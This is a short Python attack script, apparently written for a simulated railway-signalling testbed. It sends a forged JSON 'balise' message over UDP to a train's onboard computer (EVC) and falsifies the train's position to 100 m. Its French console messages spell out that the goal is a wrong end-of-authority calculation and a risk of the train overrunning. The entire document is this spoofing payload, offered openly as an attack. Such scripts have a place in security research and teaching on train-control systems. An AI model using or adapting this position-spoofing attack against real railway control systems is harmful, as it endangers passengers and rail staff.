import socket
import json

EVC_IP = "12.1.1.130"
EVC_PORT = 5002

print("[ATTACK BALISE] Injection d'une fausse balise...")
print("[ATTACK BALISE] L'EVC va recaler sa position sur une valeur incorrecte")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

fake_balise = {
    "type": "BALISE",
    "balise_id": "BG_002",
    "position": 100,
    "train_id": "TRAIN_001"
}

print(f"[ATTACK BALISE] Fausse balise injectée — position falsifiée: 100m")
print(f"[ATTACK BALISE] L'EVC croit être à 100m alors qu'il est bien plus loin")
print(f"[ATTACK BALISE] Conséquence: EOA recalculée incorrectement, risque de dépassement")

sock.sendto(json.dumps(fake_balise).encode(), (EVC_IP, EVC_PORT))
sock.close()
print(f"[ATTACK BALISE] Message envoyé")
